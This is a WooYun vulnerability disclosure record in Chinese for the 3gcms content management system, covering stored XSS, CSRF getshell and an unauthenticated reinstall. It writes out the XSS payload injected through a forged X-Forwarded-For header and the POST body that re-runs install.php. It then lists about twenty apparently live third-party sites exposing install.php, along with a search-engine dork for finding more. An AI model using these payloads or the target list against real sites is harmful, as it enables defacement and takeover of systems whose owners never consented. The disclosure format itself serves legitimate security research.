{"id": 38139, "wybug_id": "wooyun-2015-098080", "wybug_title": "3gcms漏洞打包#存储型xss/Csrf/Getshell/重装#", "wybug_corp": "3gCms", "wybug_author": "浅蓝", "wybug_date": "2015-03-02 11:24", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 如题 详细说明：  一、存储型Xsshttp://localhost/3gcms/index.php?s=guestbook 看看留言的相关代码 \n//先解密js的escape $data['author'] = htmlspecialchars(unescape($_POST['author'])); $data['content'] = htmlspecialchars(trim(unescape($_POST['content']))); $data['title'] = htmlspecialchars(trim(unescape($_POST['title']))); $data['tel'] = htmlspecialchars(trim(unescape($_POST['tel']))); $data['ip'] = get_client_ip(); $data['addtime'] = date('Y-m-d H:i:s'); //处理数据 if($pl->add($data)) { Session::set('posttime', time()); if($config['bookoff'] == 0) { echo '发布成功,留言需要管理员审核!'; exit; } else { echo '发布成功!'; exit; } } else { echo '发布失败!'; exit; }\n $data['ip'] = get_client_ip(); 再看看这个函数 /Web/Common/common.php \nfunction get_client_ip() { if (getenv(\"HTTP_CLIENT_IP\") && strcasecmp(getenv(\"HTTP_CLIENT_IP\"), \"unknown\")) $ip = getenv(\"HTTP_CLIENT_IP\"); else if (getenv(\"HTTP_X_FORWARDED_FOR\") && strcasecmp(getenv(\"HTTP_X_FORWARDED_FOR\"), \"unknown\")) $ip = getenv(\"HTTP_X_FORWARDED_FOR\"); else if (getenv(\"REMOTE_ADDR\") && strcasecmp(getenv(\"REMOTE_ADDR\"), \"unknown\")) $ip = getenv(\"REMOTE_ADDR\"); else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], \"unknown\")) $ip = $_SERVER['REMOTE_ADDR']; else $ip = \"unknown\"; return($ip); }\n 可以伪造xff 本来以为是有注入的 不过好像经过add()函数sql转义了 但是没有html转义 以下是提交留言时的监控记录 \nINSERT INTO `3gcms_guestbook` (`author`,`content`,`title`,`tel`,`ip`,`addtime`) VALUES ('&quot;&gt;&lt;img s','啊是dasdasdasd','&quot;&gt;&lt;img src=x&gt;','&quot;&gt;&lt;img src=x&gt;','\\\"><svg/onload=alert(/x/)>','2015-02-13 20:57:10')\n 除了ip以外 其他的都被html转义了 而Ip只经过sql转义 只需要伪造一下xff 改成恶意html代码即可 \n\n二、Csrf Getshell 请管理看http://www.wooyun.org/bugs/wooyun-2015-097198/trace/241e768f642e3e01e17d85afaf90fff0 里的 “漏洞证明”我只能看到详细说明三、重装3gcms 根目录里有个install.php文件没有做验证 直接提交即可修改直接post提交\nhttp://localhost/3gcms/install.php\n\nhost=localhost&user=root&password=&dbname=3gcms&install=%E5%BC%80%E5%A7%8B%E5%AE%89%E8%A3%85\n\n\n配置数据库信息即可上次说用户量少。 那我就附上一些案例http://www.py610.com/install.phphttp://zhengzhoumap.com/install.phphttp://www.qingchunyu.com//install.phphttp://www.py610.com//install.phphttp://www.guokangnami.com//install.phphttp://m.yinuoedu.net/install.phphttp://2014.web.fsai.cn/install.phphttp://3g.5-hao.com/install.phphttp://www.py610.com/install.phphttp://www.i499.cn/install.phphttp://www.yanxinmaoyi.com/3gcms/install.phphttp://www.xxditu.com/install.phphttp://www.secaijiaoyu.com/3gcms/install.phphttp://www.qmhz.net/install.phphttp://guoshida.com/install.phphttp://zhengzhoumap.com/install.phphttp://apps.foxhao.com/install.phphttp://www.lixueco.com//install.phphttp://www.pzkyy.net/3gcms/3gcms//install.phphttp://www.sdxsd.cn/b/install.phphttp://www.023rs.com/mob/install.phphttp://www.shzxys.com/img/install.php谷歌关键词：版权所有 2013-2018 3GCMS   漏洞证明：  如上   修复方案：  你们更专业   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}